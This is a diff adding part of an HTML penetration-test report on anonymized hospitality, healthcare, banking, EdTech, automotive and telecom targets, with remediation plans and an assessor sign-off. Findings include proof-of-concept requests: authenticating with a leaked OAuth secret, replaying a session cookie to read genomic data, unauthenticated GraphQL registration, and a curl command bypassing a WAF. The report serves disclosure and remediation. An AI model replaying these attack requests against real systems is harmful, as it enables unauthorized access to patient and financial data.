+        <span><span class="badge badge-high">HIGH 8.2</span> (CVSS:3.1)</span>
+      </div>
+      <div class="finding-meta-item">
+        <strong>Vulnerability Class</strong>
+        <span>CWE-798 (OWASP A07)</span>
+      </div>
+      <div class="finding-meta-item">
+        <strong>Target Environment</strong>
+        <span>Global Hospitality Management System</span>
+      </div>
+      <div class="finding-meta-item">
+        <strong>Target Scope</strong>
+        <span>Compiled React Bundle (<code>main.[hash].js</code>)</span>
+      </div>
+    </div>
+
+    <h3>Vulnerability Overview</h3>
+    <p>
+      During static client-side JavaScript bundle inspection of a cloud property management application, unminified environment configuration objects revealed an active production OAuth 2.0 <code>client_secret</code>, internal PingFederate SSO URLs, and service gateway endpoints compiled into public client code.
+    </p>
+
+    <h3>Proof of Concept (PoC)</h3>
+    <p>Extracted from production JavaScript bundle <code>/static/js/main.7c89f2a1.js</code>:</p>
+
+    <pre><code><span class="token-comment">// Extracted React Environment Configuration</span>
+window.__ENV__ = {
+  NODE_ENV: "production",
+  OAUTH_CLIENT_ID: "pms-cloud-spa-client",
+  OAUTH_CLIENT_SECRET: "sec_prod_99f84a1e7b2348[REDACTED]",
+  TOKEN_ENDPOINT: "https://auth-gateway.[redacted-hospitality].com/v1/auth-service/token.auth",
+  SAML_LOGOUT_URL: "https://sso.[redacted-hospitality].com/idp/startSLO.ping"
+};
+
+<span class="token-comment"># Verification: Authenticating directly with extracted client credentials:</span>
+<span class="token-keyword">POST</span> /v1/auth-service/token.auth HTTP/1.1
+Host: auth-gateway.[redacted-hospitality].com
+Content-Type: application/x-www-form-urlencoded
+
+grant_type=client_credentials&amp;client_id=pms-cloud-spa-client&amp;client_secret=sec_prod_99f84a1e7b2348[REDACTED]
+
+<span class="token-comment">--- [SERVER RESPONSE: HTTP/1.1 200 OK] ---</span>
+{
+  "access_token": "eyJhbGciOiJSUzI1NiIs[REDACTED]...",
+  "token_type": "Bearer",
+  "expires_in": 3600,
+  "scope": "properties:read reservations:write guest:manage"
+}</code></pre>
+
+    <h3>Threat &amp; Business Impact</h3>
+    <p>
+      Any public visitor can extract the client secret and mint authorization tokens with elevated scopes (<code>properties:read</code>, <code>reservations:write</code>), completely bypassing user consent and impersonating platform internal services.
+    </p>
+
+    <div class="remediation-box">
+      <h4>🛡️ Remediation Plan</h4>
+      <ul>
+        <li><strong>Migrate to OAuth 2.0 PKCE:</strong> Single Page Applications must utilize Proof Key for Code Exchange (RFC 7636), which entirely eliminates the need for client secrets in browser code.</li>
+        <li><strong>Revoke &amp; Rotate Credentials:</strong> Immediately invalidate the exposed secret across identity provider directories.</li>
+        <li><strong>Implement CI/CD Secret Scanning:</strong> Deploy automated scanning (TruffleHog, GitGuardian) to block secrets from entering build pipelines.</li>
+      </ul>
+    </div>
+
+    <div class="qa-box">
+      <h4>🧪 QA Verification Test Case</h4>
+      <p>
+        <strong>Automated Test:</strong> Grep compiled build output for regex <code>client_secret|api_key|private_key</code> prior to CDN asset deployment.
+      </p>
+    </div>
+  </div>
+
+  <!-- =================================================== -->
+  <!-- DETAILED FINDING: SEC-05                             -->
+  <!-- =================================================== -->
+  <div class="page-break"></div>
+
+  <div class="no-break">
+    <h2>SEC-05: Dynamic Account Switching &amp; Session Hijacking via Session Overwrite</h2>
+    
+    <div class="finding-meta-grid">
+      <div class="finding-meta-item">
+        <strong>Severity / CVSS</strong>
+        <span><span class="badge badge-high">HIGH 8.0</span> (CVSS:3.1)</span>
+      </div>
+      <div class="finding-meta-item">
+        <strong>Vulnerability Class</strong>
+        <span>CWE-384 / CWE-613 (OWASP A07)</span>
+      </div>
+      <div class="finding-meta-item">
+        <strong>Target Environment</strong>
+        <span>Healthcare &amp; Genetic Analytics Platform</span>
+      </div>
+      <div class="finding-meta-item">
+        <strong>Target Endpoint</strong>
+        <span><code>GET /api/user/session/refresh</code></span>
+      </div>
+    </div>
+
+    <h3>Vulnerability Overview</h3>
+    <p>
+      The healthcare analytics platform maintained user session state relying exclusively on an unverified <code>sessionid</code> cookie without cryptographic binding to the client's IP, user-agent, or TLS connection fingerprint. Injecting a victim's session identifier caused the server to return <code>Set-Cookie</code> response headers that permanently overwrote the browser session, seamlessly switching user accounts without re-authentication or anomaly alerts.
+    </p>
+
+    <h3>Proof of Concept (PoC)</h3>
+    <p>User B's active browser replaces its own session cookie with User A's previously captured cookie:</p>
+
+    <pre><code><span class="token-keyword">GET</span> /api/v2/patient/genetic-markers HTTP/2
+Host: portal.[redacted-healthcare].com
+Cookie: sessionid=usr_a_9941a87e2b[REDACTED]; device_id=dev_untrusted_b
+
+<span class="token-comment">--- [SERVER RESPONSE: HTTP/2 200 OK] ---</span>
+Set-Cookie: sessionid=usr_a_9941a87e2b[REDACTED]; Path=/; Secure; HttpOnly
+Content-Type: application/json
+
+{
+  "patient_id": "MED-904128",
+  "full_name": "Victim Patient A [REDACTED]",
+  "clinical_status": "Active Sequencing",
+  "genomic_risk_factors": ["BRCA1_POSITIVE", "APOE4_HETEROZYGOUS"]
+}</code></pre>
+
+    <h3>Threat &amp; Business Impact</h3>
+    <p>
+      Immediate exposure of highly confidential HIPAA-protected patient health information (PHI) and genomic profiling data. Replay attacks remain viable indefinitely due to the absence of session rotation and idle timeout enforcement.
+    </p>
+
+    <div class="remediation-box">
+      <h4>🛡️ Remediation Plan</h4>
+      <ul>
+        <li><strong>Cryptographic Context Binding:</strong> Bind session tokens to client TLS session tickets, mTLS certificates, or client-side fingerprint hashes.</li>
+        <li><strong>Regenerate Session Identifiers:</strong> Issue brand-new session IDs upon authentication, privilege elevation, and periodically during active sessions.</li>
+        <li><strong>Implement Global Session Revocation:</strong> Provide server-side session invalidation upon password reset or explicit user logout.</li>
+      </ul>
+    </div>
+
+    <div class="qa-box">
+      <h4>🧪 QA Verification Test Case</h4>
+      <p>
+        <strong>Manual Pentest:</strong> Login as User A on Browser 1. Copy session cookie to Browser 2 (different network/IP). Verify the server rejects the request with <code>HTTP 401 Session Context Mismatch</code>.
+      </p>
+    </div>
+  </div>
+
+  <!-- =================================================== -->
+  <!-- DETAILED FINDINGS: SEC-06 & SEC-07                  -->
+  <!-- =================================================== -->
+  <div class="page-break"></div>
+
+  <div class="no-break">
+    <h2>SEC-06: Unauthenticated GraphQL Registration &amp; Production JWT Minting</h2>
+    
+    <div class="finding-meta-grid">
+      <div class="finding-meta-item">
+        <strong>Severity / CVSS</strong>
+        <span><span class="badge badge-high">HIGH 7.5</span> (CVSS:3.1)</span>
+      </div>
+      <div class="finding-meta-item">
+        <strong>Vulnerability Class</strong>
+        <span>CWE-306 (OWASP A01)</span>
+      </div>
+      <div class="finding-meta-item">
+        <strong>Target Environment</strong>
+        <span>Pan-African Mobile Banking Platform</span>
+      </div>
+      <div class="finding-meta-item">
+        <strong>Target Endpoint</strong>
+        <span><code>POST /graphql</code> (Strapi Backend)</span>
+      </div>
+    </div>
+
+    <h3>Vulnerability &amp; PoC</h3>
+    <p>
+      The production financial CMS backend exposed an unrestricted GraphQL endpoint allowing unauthenticated users to execute <code>register</code> mutations. Accounts were provisioned instantly with <code>confirmed: true</code>, allowing attackers to mint production JWT bearer tokens across 1,350+ live corporate accounts without email verification.
+    </p>
+
+    <pre><code><span class="token-keyword">POST</span> /graphql HTTP/2
+Host: cms-api.[redacted-banking].com
+Content-Type: application/json
+
+{"query":"mutation { register(input: { username: \"audit_user\", email: \"audit@test.com\", password: \"[REDACTED]\" }) { jwt user { id email confirmed } } }"}
+
+<span class="token-comment">--- [SERVER RESPONSE: HTTP/2 200 OK] ---</span>
+{"data":{"register":{"jwt":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9[REDACTED]","user":{"id":"1352","email":"audit@test.com","confirmed":true}}}}</code></pre>
+
+    <div class="remediation-box">
+      <h4>🛡️ Remediation</h4>
+      <p>Disable public self-registration mutations on production GraphQL schemas; require signed email verification tokens before account activation.</p>
+    </div>
+  </div>
+
+  <div class="no-break" style="margin-top: 25px;">
+    <h2>SEC-07: Missing Server-Side Validation of Legal Terms &amp; Conditions Acceptance</h2>
+    
+    <div class="finding-meta-grid">
+      <div class="finding-meta-item">
+        <strong>Severity / CVSS</strong>
+        <span><span class="badge badge-low">LOW / QA 3.8</span> (CVSS:3.1)</span>
+      </div>
+      <div class="finding-meta-item">
+        <strong>Vulnerability Class</strong>
+        <span>CWE-20 / CWE-840 (Business Logic)</span>
+      </div>
+      <div class="finding-meta-item">
+        <strong>Target Environment</strong>
+        <span>EdTech &amp; Online Learning Platform</span>
+      </div>
+      <div class="finding-meta-item">
+        <strong>Target Endpoint</strong>
+        <span><code>POST /api/users/register/</code></span>
+      </div>
+    </div>
+
+    <h3>Vulnerability &amp; PoC</h3>
+    <p>
+      Registration API relied purely on client-side frontend checkboxes to enforce legal terms acceptance. Intercepting the request and sending <code>"has_accepted_terms_and_condition": false</code> successfully created accounts and issued JWT tokens, storing <code>terms_accepted_at: null</code>, violating GDPR/CCPA consent requirements.
+    </p>
+
+    <pre><code><span class="token-keyword">POST</span> /api/users/register/ HTTP/2
+Host: app.[redacted-edtech].com
+Content-Type: application/json
+
+{"email":"user@test.com","password":"[REDACTED]","has_accepted_terms_and_condition": false}
+
+<span class="token-comment">--- [SERVER RESPONSE: HTTP/2 201 Created] ---</span>
+{"access_token":"eyJhbGciOi[REDACTED]","user":{"id":8410,"terms_accepted_at": null}}</code></pre>
+
+    <div class="remediation-box">
+      <h4>🛡️ Remediation</h4>
+      <p>Implement strict server-side schema validation rejecting registrations where <code>has_accepted_terms_and_condition !== true</code> with HTTP 422.</p>
+    </div>
+  </div>
+
+  <!-- =================================================== -->
+  <!-- DETAILED FINDINGS: SEC-08 & SEC-09                  -->
+  <!-- =================================================== -->
+  <div class="page-break"></div>
+
+  <div class="no-break">
+    <h2>SEC-08: Direct Origin Ingress &amp; WAF Bypass via Latency Header IP Disclosure</h2>
+    
+    <div class="finding-meta-grid">
+      <div class="finding-meta-item">
+        <strong>Severity / CVSS</strong>
+        <span><span class="badge badge-high">HIGH 7.5</span> (CVSS:3.1)</span>
+      </div>
+      <div class="finding-meta-item">
+        <strong>Vulnerability Class</strong>
+        <span>CWE-200 / CWE-693 (OWASP A05)</span>
+      </div>
+      <div class="finding-meta-item">
+        <strong>Target Environment</strong>
+        <span>Connected Vehicle &amp; EV Enterprise</span>
+      </div>
+      <div class="finding-meta-item">
+        <strong>Target Endpoint</strong>
+        <span><code>auth.[redacted].com &amp; owner-api.[redacted].com</code></span>
+      </div>
+    </div>
+
+    <h3>Vulnerability &amp; PoC</h3>
+    <p>
+      CDN latency profiling headers (<code>X-EdgeConnect-Origin-MEX-Latency</code> and <code>OriginIP</code>) leaked backend origin IP addresses (<code>66.17.x.x</code>). Sending requests directly to the origin via DNS resolution overrides (<code>curl --resolve</code>) completely bypassed the Akamai WAF perimeter, enabling unthrottled token attacks. Furthermore, internal subnet spoofing via <code>Client-IP: 192.168.90.100</code> triggered unhandled HTTP 500 Denial of Service crashes on the vehicle API.
+    </p>
+
+    <pre><code><span class="token-comment"># Direct connection to origin IP completely bypassing Akamai WAF:</span>
+curl -k -H "Host: auth.[redacted-automotive].com" --resolve auth.[redacted-automotive].com:443:66.17.x.x https://auth.[redacted-automotive].com/oauth/token
+
+<span class="token-comment">--- [SERVER RESPONSE: HTTP/1.1 200 OK (Direct Origin Response, No WAF Headers)] ---</span></code></pre>
+
+    <div class="remediation-box">
+      <h4>🛡️ Remediation</h4>
+      <p>Configure origin firewalls (Security Groups) to drop all inbound traffic not originating from Akamai IP CIDR blocks (Origin Shielding); strip latency profiling headers at reverse proxies.</p>
+    </div>
+  </div>
+
+  <div class="no-break" style="margin-top: 25px;">
+    <h2>SEC-09: Exposure of EOL Apache Cocoon (2.0.4) &amp; Critical CVE Vectors</h2>
+    
+    <div class="finding-meta-grid">
+      <div class="finding-meta-item">
+        <strong>Severity / CVSS</strong>
+        <span><span class="badge badge-low">P5 / LOW 5.3</span> (Underlying CVEs 9.8)</span>
+      </div>
+      <div class="finding-meta-item">
+        <strong>Vulnerability Class</strong>
+        <span>CWE-1104 / OWASP A06:2021</span>
+      </div>
+      <div class="finding-meta-item">
+        <strong>Target Environment</strong>
+        <span>National Telecommunications Provider</span>
+      </div>
+      <div class="finding-meta-item">
+        <strong>Target Scope</strong>
+        <span>Enterprise Facility Portals (<code>eFRAMS3</code>)</span>
+      </div>
+    </div>
+
+    <h3>Vulnerability &amp; PoC</h3>
+    <p>
+      Portals leaked <code>X-Cocoon-Version: 2.0.4</code> and <code>Server: Apache-Coyote/1.1</code>. Version 2.0.4 is a retired, unmaintained framework vulnerable to unpatched Critical XXE (CVE-2023-49733, CVSS 9.8), SQLi (CVE-2022-45135, CVSS 8.8), and session hijacking (CVE-2025-24783). Unauthenticated login interface exposed XML SQL namespaces (<code>xmlns:sql</code>) and Java XSLT bindings (<code>xmlns:java</code>). Edge testing showed instance FM1 allows unauthenticated access while FM2 enforces Akamai WAF Rule #18.
+    </p>
+
+    <pre><code><span class="token-keyword">GET</span> /eFRAMS3/ HTTP/1.1
+Host: portal-fm1.[redacted-telecom].net
+
+<span class="token-comment">--- [SERVER RESPONSE: HTTP/1.1 200 OK] ---</span>
+X-Cocoon-Version: 2.0.4
+Server: Apache-Coyote/1.1
+Content-Type: text/html; charset=ISO-8859-1</code></pre>
+
+    <div class="remediation-box">
+      <h4>🛡️ Remediation</h4>
+      <p>Decommission/replace the legacy Apache Cocoon framework; harmonize edge WAF rules across cluster nodes; disable external XML entity parsing.</p>
+    </div>
+  </div>
+
+  <!-- =================================================== -->
+  <!-- DETAILED FINDING: SEC-10 & STRATEGIC ROADMAP        -->
+  <!-- =================================================== -->
+  <div class="page-break"></div>
+
+  <div class="no-break">
+    <h2>SEC-10: Cleartext Credential Transmission via Hardcoded HTTP Form Action</h2>
+    
+    <div class="finding-meta-grid">
+      <div class="finding-meta-item">
+        <strong>Severity / CVSS</strong>
+        <span><span class="badge badge-medium">MEDIUM / P4 6.5</span> (CVSS:3.1)</span>
+      </div>
+      <div class="finding-meta-item">
+        <strong>Vulnerability Class</strong>
+        <span>CWE-319 / CWE-523 (OWASP A02)</span>
+      </div>
+      <div class="finding-meta-item">
+        <strong>Target Environment</strong>
+        <span>National Mobile &amp; Telecom Carrier</span>
+      </div>
+      <div class="finding-meta-item">
+        <strong>Target Endpoint</strong>
+        <span><code>https://www.[redacted].com.au/signon/portal/login.fcc</code></span>
+      </div>
+    </div>
+
+    <h3>Vulnerability &amp; PoC</h3>
+    <p>
+      The CA SiteMinder customer login portal rendered over HTTPS, but the underlying HTML form was hardcoded with an unencrypted HTTP action: <code>&lt;FORM ACTION="http://www.[redacted].com.au/siteminderagent/portal/login.fcc" METHOD="POST"&gt;</code>. Submitting credentials transmits passwords in cleartext over port 80 to the edge before an HTTP 302 redirect occurs, exposing users on public networks (Wi-Fi, ISP) to passive MITM credential sniffing. Internal SSO parameters (<code>REALMOID</code>, <code>SMAGENTNAME</code>) were also leaked, and rate limiting was enforced only via client-side cookies.
+    </p>
+
+    <pre><code><span class="token-comment"># Cleartext credential submission over unencrypted port 80:</span>
+<span class="token-keyword">POST</span> http://www.[redacted-telecom].com.au/siteminderagent/portal/login.fcc HTTP/1.1
+Host: www.[redacted-telecom].com.au
+Content-Type: application/x-www-form-urlencoded
+
+USER=customer_user&amp;PASSWORD=PlaintextSecret123!&amp;target=
+
+<span class="token-comment">--- [SERVER RESPONSE: HTTP/1.1 302 Moved Temporarily (AkamaiGHost)] ---</span>
+Location: https://www.[redacted-telecom].com.au/siteminderagent/portal/login.fcc</code></pre>
+
+    <div class="remediation-box">
+      <h4>🛡️ Remediation</h4>
+      <p>Update form action to strict <code>https://</code>; implement HSTS preload (<code>max-age=31536000; includeSubDomains; preload</code>); enforce CSP <code>form-action 'self' https://*</code>; implement server-side rate limiting.</p>
+    </div>
+  </div>
+
+  <h1 style="margin-top: 30px;">
+    <span>4. Strategic Remediation Roadmap</span>
+    <span style="font-size: 8pt; font-family: 'JetBrains Mono'; color: #64748b; font-weight: normal;">ACTION PLAN</span>
+  </h1>
+
+  <table style="margin-top: 10px;">
+    <thead>
+      <tr>
+        <th style="width: 20%;">Phase</th>
+        <th style="width: 45%;">Strategic Remediation Focus</th>
+        <th style="width: 20%;">Addressed IDs</th>
+        <th style="width: 15%;">Target Window</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>Phase 1: Emergency</strong></td>
+        <td>Revoke leaked OAuth secret; enforce strict HTTPS in login form; restrict file storage bucket ingress.</td>
+        <td><code>SEC-02, SEC-04, SEC-10</code></td>
+        <td>0 – 72 Hours</td>
+      </tr>
+      <tr>
+        <td><strong>Phase 2: Ingress Hardening</strong></td>
+        <td>Implement Origin Shielding firewall rules; strip <code>x5c</code> &amp; latency headers; patch GraphQL schemas.</td>
+        <td><code>SEC-03, SEC-06, SEC-08</code></td>
+        <td>1 – 2 Weeks</td>
+      </tr>
+      <tr>
+        <td><strong>Phase 3: Architectural</strong></td>
+        <td>Decommission EOL Apache Cocoon; implement server-side tenancy claims (BOLA fix); session context binding.</td>
+        <td><code>SEC-01, SEC-05, SEC-07, SEC-09</code></td>
+        <td>30 – 60 Days</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <!-- =================================================== -->
+  <!-- CONSULTANT SIGN-OFF & APPENDIX                      -->
+  <!-- =================================================== -->
+  <div class="page-break"></div>
+
+  <h1>
+    <span>5. Sign-Off &amp; Certification</span>
+    <span style="font-size: 8pt; font-family: 'JetBrains Mono'; color: #64748b; font-weight: normal;">FINAL VERIFICATION</span>
+  </h1>
+
+  <p>
+    This report provides a formal record of security vulnerabilities, technical attack paths, proof-of-concept evidence, and architectural remediation steps identified during the engagement. All findings have been verified through offensive testing methodologies and validated against industry standards.
+  </p>
+
+  <div style="border: 1px solid #cbd5e1; border-radius: 8px; padding: 20px; margin: 25px 0; background: #f8fafc;">
+    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 30px;">
+      <div>
+        <h3 style="margin-top: 0; color: #0f172a;">Assessor Certification</h3>
+        <p style="font-size: 9pt; margin-bottom: 15px;">
+          I hereby certify that the security assessments, vulnerability demonstrations, and remediation roadmaps detailed within this document were conducted with professional rigor adhering to the OWASP Web Security Testing Guide (WSTG v4.2) and the Penetration Testing Execution Standard (PTES).
+        </p>
+        <div style="margin-top: 20px;">
+          <div style="font-family: 'JetBrains Mono', monospace; font-size: 11pt; font-weight: bold; color: #0f172a; margin-bottom: 2px;">
+            Kanan Gandhi
+          </div>
+          <div style="font-size: 8.5pt; color: #64748b;">
+            Web Application Security &amp; QA Consultant<br>
+            Email: kanangandhi62@gmail.com<br>
+            LinkedIn: linkedin.com/in/kanan-gandhi-159449a2/<br>
+            Portfolio: kanangandhi93.github.io/portfolio/
+          </div>
+        </div>
+      </div>
+
+      <div>
+        <h3 style="margin-top: 0; color: #0f172a;">Engagement Governance</h3>
+        <ul style="font-size: 8.5pt; color: #475569; margin-left: 15px;">
+          <li><strong>Confidentiality:</strong> Strictly Restricted / Commercial-in-Confidence</li>
+          <li><strong>Target Status:</strong> Fully Anonymized &amp; Redacted (Safe for Client Review)</li>
+          <li><strong>Verification Status:</strong> All 10 Vulnerabilities Verified</li>
+          <li><strong>Report Hash (SHA-256):</strong> Generated upon final compile</li>
+          <li><strong>Date of Issuance:</strong> September 2026</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <div class="callout callout-warning">
+    <strong>Disclaimer:</strong> This assessment represents the security posture of the identified target systems during the defined testing windows. Changes in backend code, infrastructure deployments, or third-party dependencies may alter risk levels. Periodic re-testing and continuous secure SDLC integration are strongly recommended.
+  </div>
+
+</body>
+</html>
